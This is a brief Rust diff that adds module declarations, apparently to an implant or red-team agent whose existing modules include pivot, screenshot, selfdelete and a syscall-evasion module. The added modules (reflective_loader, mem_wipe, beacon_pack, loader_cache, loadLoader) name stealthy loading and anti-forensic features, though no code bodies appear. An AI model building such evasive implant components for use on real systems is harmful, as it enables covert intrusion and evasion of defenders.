@@ -21,8 +21,13 @@ mod features {
     pub mod pivot;
     pub mod screenshot;
     pub mod selfdelete;
+    pub mod loadLoader;
 }
 mod hellshall;
+mod mem_wipe;
+mod reflective_loader;
+mod beacon_pack;
+mod loader_cache;
 mod selfprotect;
 mod worker;
 mod helpers;
